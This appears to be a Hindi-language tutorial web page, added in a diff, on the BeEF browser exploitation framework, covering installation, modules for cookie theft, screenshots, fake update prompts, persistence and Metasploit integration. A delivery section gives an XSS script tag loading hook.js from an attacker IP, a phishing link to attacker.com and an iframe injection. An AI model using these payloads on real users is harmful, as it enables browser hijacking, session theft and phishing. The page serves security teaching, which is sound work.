@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>BeEF - Ethical Learn | साइबर सिक्योरिटी टूल</title>
+    <link rel="stylesheet" href="../style.css">
+    <style>
+        .tool-detail {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: white;
+            border-radius: 1.5rem;
+            box-shadow: 0 4px 14px rgba(0,0,0,0.1);
+        }
+        .tool-detail h1 {
+            color: #1f6392;
+            margin-bottom: 1rem;
+            font-size: 2rem;
+        }
+        .tool-detail h3 {
+            margin: 1.8rem 0 0.8rem 0;
+            color: #0f2c3d;
+            border-left: 4px solid #1f6392;
+            padding-left: 12px;
+        }
+        .tool-detail pre {
+            background: #1e2a3a;
+            color: #eef4ff;
+            padding: 1rem;
+            border-radius: 0.8rem;
+            overflow-x: auto;
+            margin: 0.8rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        .tool-detail .cmd-note {
+            color: #4a6a7a;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            padding-left: 0.5rem;
+            border-left: 3px solid #7bc6e6;
+        }
+        .tool-detail ul {
+            margin-left: 1.5rem;
+            margin-top: 0.5rem;
+        }
+        .tool-detail li {
+            margin: 0.5rem 0;
+            line-height: 1.5;
+        }
+        .tool-detail a {
+            color: #1f6392;
+            text-decoration: none;
+        }
+        .tool-detail a:hover {
+            text-decoration: underline;
+        }
+        .back-link {
+            display: inline-block;
+            margin-top: 2rem;
+            background: #1f6392;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 2rem;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.2s;
+        }
+        .back-link:hover {
+            background: #0f4b6e;
+            transform: scale(0.98);
+        }
+        .badge {
+            display: inline-block;
+            background: #eef2fa;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            margin-right: 8px;
+            color: #1f6392;
+        }
+        hr {
+            margin: 1.5rem 0;
+            border-color: #e0e7f0;
+        }
+        .highlight {
+            background: #f0f7ff;
+            padding: 0.5rem;
+            border-radius: 8px;
+            margin: 0.5rem 0;
+        }
+        @media (max-width: 780px) {
+            .tool-detail {
+                margin: 1rem;
+                padding: 1.2rem;
+            }
+            .tool-detail h1 {
+                font-size: 1.5rem;
+            }
+            pre {
+                font-size: 0.7rem;
+            }
+        }
+    </style>
+        <!-- Google AdSense Code -->
+    <meta name="google-adsense-account" content="ca-pub-6124052333813612">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6124052333813612"
+     crossorigin="anonymous"></script>
+</head>
+<body>
+
+<header>
+    <div class="navbar">
+        <div class="logo-area">
+            <div class="ethical-logo"><span>EL</span></div>
+            <div class="logo-text"><h1>Ethical Learn</h1><p>cyber security hub</p></div>
+        </div>
+        <div class="nav-links">
+            <a href="../index.html">Home</a>
+            <a href="#" id="navToolsTrigger">Tools</a>
+            <a href="about.html" id="navAbout">About</a>
+            <a href="contant.html" id="navComment">Comment</a>
+        </div>
+        <button class="menu-btn" id="mainToolsMenuBtn"><span class="menu-icon">🛠️</span> Tools Menu</button>
+        <button class="mobile-menu-icon" id="mobileMenuToggle">☰</button>
+    </div>
+    <div id="mobileMenuPanel" style="display: none; background:#0e1c2c; padding: 1rem 2rem; flex-direction: column; gap: 1rem; border-bottom: 1px solid #2c7da0;">
+        <a href="../index.html" style="color:white; text-decoration:none;">🏠 Home</a>
+        <a href="#" id="mobileTools" style="color:white; text-decoration:none;">🛠️ Tools</a>
+        <a href="#" id="mobileAbout" style="color:white; text-decoration:none;">📖 About</a>
+        <a href="#" id="mobileComment" style="color:white; text-decoration:none;">💬 Comment</a>
+    </div>
+</header>
+
+<main>
+  <!-- Header Ad -->
+<div class="ad-container ad-header" style="max-width: 1200px; margin: 10px auto;">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-6124052333813612"
+         data-ad-slot="XXXXXXXXXX"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+</div>
+    <div class="tool-detail">
+        <h1>🐮 BeEF - Browser Exploitation Framework</h1>
+        <p><span class="badge">🌐 Browser Exploitation</span> <span class="badge">🎯 Client-Side Attacks</span> <span class="badge">🕸️ XSS Framework</span></p>
+        <p><strong>Category:</strong> 6️⃣ Exploitation Tools</p>
+        <hr>
+
+        <h3>📝 Description</h3>
+        <p>BeEF (Browser Exploitation Framework) एक शक्तिशाली क्लाइंट-साइड अटैक फ्रेमवर्क है। यह वेब ब्राउज़र्स की कमजोरियों का फायदा उठाकर टारगेट के ब्राउज़र पर कंट्रोल लेता है। BeEF एक JavaScript "हुक" के माध्यम से ब्राउज़र को "ज़ॉम्बी" बना देता है, जिसके बाद आप उस ब्राउज़र पर कई कमांड्स चला सकते हैं - स्क्रीनशॉट लेना, कीस्ट्रोक लॉग करना, इंटरनल नेटवर्क स्कैन करना, और भी बहुत कुछ।</p>
+        <p><strong>विशेषता:</strong> BeEF की सबसे बड़ी खासियत है कि यह सर्वर-साइड नहीं बल्कि क्लाइंट-साइड फोकस करता है। एक बार ब्राउज़र हुक हो जाए, तो आप उस ब्राउज़र पर पूरा कंट्रोल ले सकते हैं, चाहे वह कहीं भी हो।</p>
+
+        <h3>📦 Installation</h3>
+        <p><strong>Kali Linux (पहले से इंस्टॉल):</strong></p>
+        <pre>beef-xss</pre>
+        <p><strong>Ubuntu/Debian:</strong></p>
+        <pre>sudo apt update
+sudo apt install beef-xss -y</pre>
+        <p><strong>GitHub से इंस्टॉल:</strong></p>
+        <pre>git clone https://github.com/beefproject/beef.git
+cd beef
+./install
+./beef</pre>
+        <p><strong>Docker से चलाना:</strong></p>
+        <pre>docker pull beefproject/beef
+docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 beefproject/beef</pre>
+
+        <h3>💻 Common Commands (उदाहरण सहित)</h3>
+        
+        <div class="highlight">
+            <p><strong>📌 BeEF शुरू करना:</strong></p>
+            <pre>sudo beef-xss</pre>
+            <div class="cmd-note">👉 <strong>उदाहरण:</strong> BeEF सर्वर शुरू होता है। Web UI: http://127.0.0.1:3000/ui/panel (डिफॉल्ट: beef/beef)</div>
+        </div>
+        
+        <p><strong>🔹 1. हुक (Hook) URL प्राप्त करना:</strong></p>
+        <pre>http://127.0.0.1:3000/hook.js</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> यह JavaScript फाइल है जिसे टारगेट के ब्राउज़र में लोड करना है। इसे XSS वल्नरेबिलिटी के माध्यम से या किसी लिंक के जरिए भेजा जा सकता है।</div>
+
+        <p><strong>🔹 2. डेमो पेज पर हुक टेस्ट करना:</strong></p>
+        <pre>http://127.0.0.1:3000/demos/basic.html</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> BeEF के साथ आने वाला डेमो पेज, जहाँ हुक पहले से लगा होता है।</div>
+
+        <p><strong>🔹 3. हुक किए गए ब्राउज़र देखना:</strong></p>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> Web UI में "Online Browsers" सेक्शन में सभी हुक किए गए ब्राउज़र दिखते हैं (IP, OS, ब्राउज़र वर्जन, आदि)।</div>
+
+        <p><strong>🔹 4. ब्राउज़र पर कमांड चलाना:</strong></p>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> किसी ब्राउज़र पर क्लिक करें → "Commands" टैब → कमांड चुनें (जैसे "Get Cookies", "Get Geolocation") → "Execute" दबाएं।</div>
+
+        <h3>🎯 BeEF के मुख्य कमांड्स (मॉड्यूल):</h3>
+        
+        <p><strong>🔹 Browser Fingerprinting:</strong></p>
+        <pre>Browser → Detect Browser
+Browser → Get Browser Fingerprint</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> ब्राउज़र का प्रकार, वर्जन, OS, स्क्रीन रेजोल्यूशन, फॉन्ट्स की जानकारी लेना।</div>
+
+        <p><strong>🔹 Cookies & Storage:</strong></p>
+        <pre>Browser → Get Cookie
+Browser → Get Local Storage
+Browser → Get Session Storage</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> ब्राउज़र में सेव कुकीज़ और लोकल स्टोरेज डेटा चुराना।</div>
+
+        <p><strong>🔹 Geolocation:</strong></p>
+        <pre>Browser → Get Geolocation (GPS)</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> टारगेट की लोकेशन (अगर ब्राउज़र ने परमिशन दी हो) प्राप्त करना।</div>
+
+        <p><strong>🔹 Screenshot:</strong></p>
+        <pre>Browser → Take Screenshot (HTML2Canvas)</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> टारगेट के ब्राउज़र विंडो का स्क्रीनशॉट लेना।</div>
+
+        <p><strong>🔹 Social Engineering:</strong></p>
+        <pre>Social Engineering → Fake Notification (Chrome)
+Social Engineering → Fake Flash Update</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> फेक अपडेट नोटिफिकेशन दिखाकर यूजर को फाइल डाउनलोड करने के लिए मजबूर करना।</div>
+
+        <p><strong>🔹 Network Discovery:</strong></p>
+        <pre>Network → Ping Sweep
+Network → Port Scanner
+Network → Get Internal IP</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> टारगेट के इंटरनल नेटवर्क (192.168.x.x) को स्कैन करना।</div>
+
+        <p><strong>🔹 Persistence:</strong></p>
+        <pre>Persistence → Create Pop Under
+Persistence → Man-in-the-Browser</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> ब्राउज़र बंद करने के बाद भी हुक बनाए रखना।</div>
+
+        <p><strong>🔹 Exploits:</strong></p>
+        <pre>Exploits → Internet Explorer CSS 0day
+Exploits → Firefox PDF Viewer Exploit</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> ब्राउज़र या प्लगइन की वल्नरेबिलिटी को एक्सप्लॉइट करना।</div>
+
+        <p><strong>🔹 Metasploit Integration:</strong></p>
+        <pre>Metasploit → Bind Metasploit Payload
+Metasploit → Reverse TCP Payload</pre>
+        <div class="cmd-note">👉 <strong>उदाहरण:</strong> Metasploit पेलोड को ब्राउज़र पर भेजकर पूरा Meterpreter सेशन प्राप्त करना।</div>
+
+        <h3>🎯 BeEF के मुख्य टैब्स:</h3>
+        <ul>
+            <li><strong>Getting Started:</strong> शुरुआती गाइड और डेमो लिंक्स</li>
+            <li><strong>Online Browsers:</strong> सभी हुक किए गए ब्राउज़र (IP, OS, ब्राउज़र वर्जन, कुकीज़, आदि)</li>
+            <li><strong>Commands:</strong> उपलब्ध सभी कमांड्स की लिस्ट (रंग कोडेड: ग्रीन = काम करता है, ऑरेंज = पता नहीं, रेड = काम नहीं करता)</li>
+            <li><strong>Logs:</strong> सभी कमांड एक्जीक्यूशन का लॉग</li>
+            <li><strong>REST API:</strong> API एंडपॉइंट्स (डेवलपर्स के लिए)</li>
+            <li><strong>Configuration:</strong> सेटिंग्स और मॉड्यूल कॉन्फ़िगरेशन</li>
+        </ul>
+
+        <h3>🎯 Use Cases (उपयोग के तरीके)</h3>
+        <ul>
+            <li><strong>XSS वल्नरेबिलिटी टेस्टिंग:</strong> XSS पेलोड्स को टेस्ट करना और उनका असर देखना।</li>
+            <li><strong>क्लाइंट-साइड सिक्योरिटी ऑडिट:</strong> यूजर्स के ब्राउज़र पर कितना कंट्रोल लिया जा सकता है, यह जांचना।</li>
+            <li><strong>सोशल इंजीनियरिंग टेस्टिंग:</strong> यूजर्स को फेक अपडेट्स पर क्लिक करने के लिए कैसे मजबूर किया जा सकता है।</li>
+            <li><strong>इंटरनल नेटवर्क मैपिंग:</strong> हुक किए गए ब्राउज़र से इंटरनल नेटवर्क स्कैन करना।</li>
+            <li><strong>Metasploit इंटीग्रेशन:</strong> ब्राउज़र हुक से Meterpreter सेशन प्राप्त करना।</li>
+        </ul>
+
+        <h3>⚙️ Key Features (मुख्य विशेषताएँ)</h3>
+        <ul>
+            <li>✔️ 200+ कमांड्स (ब्राउज़र फिंगरप्रिंटिंग, कुकी स्टीलिंग, स्क्रीनशॉट, कीलॉगर, आदि)</li>
+            <li>✔️ रियल-टाइम ब्राउज़र कंट्रोल</li>
+            <li>✔️ हुक किए गए ब्राउज़र की डिटेल्ड प्रोफाइल</li>
+            <li>✔️ Metasploit इंटीग्रेशन</li>
+            <li>✔️ REST API (ऑटोमेशन के लिए)</li>
+            <li>✔️ सोशल इंजीनियरिंग मॉड्यूल्स</li>
+            <li>✔️ इंटरनल नेटवर्क स्कैनिंग</li>
+            <li>✔️ पर्सिस्टेंस मैकेनिज्म (ब्राउज़र बंद होने पर भी हुक बनाए रखना)</li>
+            <li>✔️ वेब UI के साथ आता है</li>
+            <li>✔️ क्रॉस-प्लेटफॉर्म (Linux, Windows, macOS)</li>
+        </ul>
+
+        <div class="highlight">
+            <p><strong>📌 BeEF हुक URL कैसे भेजें:</strong></p>
+            <ul>
+                <li><strong>XSS वल्नरेबिलिटी:</strong> किसी वेबसाइट में XSS पेलोड डालें: <code>&lt;script src="http://your-ip:3000/hook.js"&gt;&lt;/script&gt;</code></li>
+                <li><strong>ईमेल फिशिंग:</strong> लिंक भेजें: <code>http://attacker.com/beef-hook.html</code></li>
+                <li><strong>URL शॉर्टनर:</strong> URL शॉर्टनर से लिंक छुपाना</li>
+                <li><strong>Iframe:</strong> <code>&lt;iframe src="http://your-ip:3000/demos/basic.html"&gt;&lt;/iframe&gt;</code></li>
+            </ul>
+        </div>
+
+        <div class="highlight">
+            <p><strong>📌 BeEF vs Metasploit:</strong></p>
+            <ul>
+                <li><strong>BeEF:</strong> क्लाइंट-साइड (ब्राउज़र) फोकस, सोशल इंजीनियरिंग, ब्राउज़र एक्सप्लॉइट्स</li>
+                <li><strong>Metasploit:</strong> सर्वर-साइड फोकस, सिस्टम एक्सप्लॉइट्स, पेलोड जनरेशन</li>
+                <li><strong>अनुशंसा:</strong> दोनों एक साथ उपयोग करें - BeEF से ब्राउज़र हुक करें, फिर Metasploit से Meterpreter पेलोड भेजें।</li>
+            </ul>
+        </div>
+
+        <h3>🔗 Official Resources</h3>
+        <ul>
+            <li><strong>Official Website:</strong> <a href="https://beefproject.com" target="_blank">https://beefproject.com</a></li>
+            <li><strong>GitHub Repository:</strong> <a href="https://github.com/beefproject/beef" target="_blank">https://github.com/beefproject/beef</a></li>
+            <li><strong>Documentation:</strong> <a href="https://github.com/beefproject/beef/wiki" target="_blank">BeEF Wiki</a></li>
+            <li><strong>Kali Linux Tools:</strong> <a href="https://www.kali.org/tools/beef-xss/" target="_blank">Kali BeEF Page</a></li>
+        </ul>
+
+        <h3>🔧 Related Tools (समान उपकरण)</h3>
+        <ul>
+            <li><strong>Metasploit:</strong> एक्सप्लॉइटेशन फ्रेमवर्क</li>
+            <li><strong>XSSer:</strong> XSS वल्नरेबिलिटी स्कैनर</li>
+            <li><strong>XSStrike:</strong> एडवांस्ड XSS स्कैनर</li>
+            <li><strong>OWASP ZAP:</strong> XSS डिटेक्शन और टेस्टिंग</li>
+            <li><strong>Burp Suite:</strong> XSS टेस्टिंग के लिए Intruder और Scanner</li>
+        </ul>
+
+        <div class="highlight">
+            <p><strong>📌 BeEF के लिए सुझाव:</strong></p>
+            <ul>
+                <li>पहले डेमो पेज (<code>/demos/basic.html</code>) पर प्रैक्टिस करें</li>
+                <li>हुक URL को किसी XSS वल्नरेबिलिटी के माध्यम से टेस्ट करें</li>
+                <li>Metasploit के साथ इंटीग्रेट करें (पूरा Meterpreter सेशन)</li>
+                <li>कुकीज़ और सेशन हाईजैकिंग का प्रैक्टिस करें</li>
+                <li>सोशल इंजीनियरिंग मॉड्यूल्स का उपयोग करें</li>
+            </ul>
+        </div>
+
+        <h3>⚠️ Important Note (सावधानी)</h3>
+        <p><strong>BeEF एक बेहद शक्तिशाली ब्राउज़र एक्सप्लॉइटेशन फ्रेमवर्क है। इसका उपयोग केवल उन्हीं सिस्टम पर करें जिनकी आपको लिखित अनुमति हो। बिना अनुमति के ब्राउज़र हुक करना, कुकी चुराना, या ब्राउज़र पर कंट्रोल लेना कानूनी अपराध है। हमेशा अपने खुद के सिस्टम, CTF चैलेंज, या बग बाउंटी प्रोग्राम पर ही प्रैक्टिस करें। BeEF का उपयोग सीखने और सुरक्षा ऑडिट के लिए करें, न कि अनधिकृत पहुंच के लिए।</strong></p>
+
+        <button class="back-link" onclick="window.location.href='../index.html'">← Back to Home</button>
+    </div>
+</main>
+
+<footer>
+    <p>© 2025 Ethical Learn — Empowering security researchers. All tools are for authorized testing only.</p>
+</footer>
+
+<script>
+    function openOverlay() {
+        let overlay = document.getElementById("globalToolsOverlay");
+        if (!overlay) {
+            overlay = document.createElement("div");
+            overlay.id = "globalToolsOverlay";
+            overlay.className = "tools-overlay";
+            overlay.innerHTML = `
+                <div class="tools-container">
+                    <button class="close-menu" id="closeOverlayBtnGlobal">✕</button>
+                    <h2 style="color:white; margin-bottom:0.5rem;">🛡️ Security Tools Arsenal</h2>
+                    <p style="color:#bbd4f0; margin-bottom:1rem;">Click any tool to open its dedicated page</p>
+                    <div class="tools-grid" id="globalToolsGrid"></div>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+            document.getElementById("closeOverlayBtnGlobal")?.addEventListener("click", () => overlay.classList.remove("open"));
+            overlay.addEventListener("click", (e) => { if (e.target === overlay) overlay.classList.remove("open"); });
+            const tools = ["Nmap", "Maltego", "theHarvester", "Recon-ng", "dnsenum", "dnsrecon", "Nikto", "OpenVAS", "OWASP ZAP", "SQLmap", "Burp Suite", "Commix", "Skipfish", "Wfuzz", "Hydra", "Hashcat", "John the Ripper", "Medusa", "Aircrack-ng", "Reaver", "Kismet", "Wifite", "Metasploit", "BeEF", "Armitage", "Wireshark", "Ettercap", "Bettercap", "Autopsy", "Binwalk", "Foremost"];
+            const grid = document.getElementById("globalToolsGrid");
+            if (grid) {
+                grid.className = "tools-grid";
+                let html = '';
+                tools.forEach(tool => {
+                    let filename = tool.toLowerCase().replace(/ /g, '-').replace(/[^a-z0-9-]/g, '');
+                    if (tool === "John the Ripper") filename = "john-the-ripper";
+                    if (tool === "OWASP ZAP") filename = "owasp-zap";
+                    if (tool === "Burp Suite") filename = "burpsuite";
+                    if (tool === "Recon-ng") filename = "recon-ng";
+                    if (tool === "theHarvester") filename = "theharvester";
+                    if (tool === "Aircrack-ng") filename = "aircrack-ng";
+                    html += `<div class="tool-category"><ul class="tool-list"><li><a href="../tools/${filename}.html">🔧 ${tool}</a></li></ul></div>`;
+                });
+                grid.innerHTML = html;
+            }
+        }
+        overlay.classList.add("open");
+    }
+    document.getElementById("navToolsTrigger")?.addEventListener("click", (e) => { e.preventDefault(); openOverlay(); });
+    document.getElementById("mainToolsMenuBtn")?.addEventListener("click", () => openOverlay());
+    const mobileToggle = document.getElementById("mobileMenuToggle");
+    const mobilePanel = document.getElementById("mobileMenuPanel");
+    if (mobileToggle && mobilePanel) {
+        mobileToggle.addEventListener("click", () => { mobilePanel.style.display = mobilePanel.style.display === "none" || mobilePanel.style.display === "" ? "flex" : "none"; });
+        document.getElementById("mobileTools")?.addEventListener("click", (e) => { e.preventDefault(); openOverlay(); mobilePanel.style.display = "none"; });
+        document.getElementById("mobileAbout")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#about"; });
+        document.getElementById("mobileComment")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#comment"; });
+    }
+    document.getElementById("navAbout")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#about"; });
+    document.getElementById("navComment")?.addEventListener("click", (e) => { e.preventDefault(); window.location.href = "../index.html#comment"; });
+</script>
+</body>
+</html>
